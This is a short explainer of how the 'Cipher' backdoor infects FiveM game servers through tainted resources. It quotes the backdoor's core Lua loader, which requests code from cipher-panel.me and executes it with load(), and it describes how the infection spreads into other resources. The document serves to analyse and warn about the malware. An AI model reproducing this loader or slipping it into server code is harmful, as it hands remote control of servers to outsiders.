# How Cipher Works
**Cipher** works by releasing infected code/resources to the FiveM public. Server owners/developers take the code (that they don't know is infected) and install it on their servers. Once the resource is installed and ran it will inject its code into other previously clean resources.

**The initial infected code boils down to the following:**

```Lua
PerformHttpRequest('https://cipher-panel.me/_i/i?to=UNIQUECODE', function (e, d)
	local s = assert(load(d))
	if (d == nil) then return end 
	s() 
end)
```

The **Unique Code** in the URL request is the Cipher user that now has control of your server. Once this code is ran it downloads the remote code (from Cipher) and runs it on line 4 as a function.

This is the basis on how most of Cipher works. It proceeds to download several more requests (found in the code returned by Cipher) and will continue until it injects more pre-existing resources.

Read **Infection Documentation** for more information on what it expands into.